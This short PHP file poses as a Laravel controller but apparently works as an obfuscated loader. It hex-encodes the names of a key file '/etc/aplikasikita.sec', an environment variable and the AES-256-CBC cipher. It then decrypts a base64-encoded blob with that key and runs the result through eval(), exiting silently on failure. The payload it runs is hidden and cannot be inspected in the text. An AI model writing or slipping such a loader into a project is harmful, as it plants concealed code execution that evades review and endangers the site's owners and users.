<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('nNtkoVuCSKmKmna+A5cHMg==');

$c=base64_decode(

'Y1LfWd9rmhpKFonS5M4Vhojam+cfPaNsd6xmdwtPhg1jLsyS/Oz6pX81ApwZKx/APSpYasP7RUzI' .
'PvIb8JomIHH4KeKfUQ3R6Fxa5FonKexSd7+mx3lJPgNwvduCr9Fzs3t3akCb20SvVY3XcBODAwh8' .
'/NozUjCzJySFK3oCC+qZUluDLYEhM0u8ykXooT8o+ir94I5Kvq0C/4qEKBbtZBC7Wt5jB6JB39ml' .
'tAc3U30RItDaewXYVIxYuPHIqdbJ'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

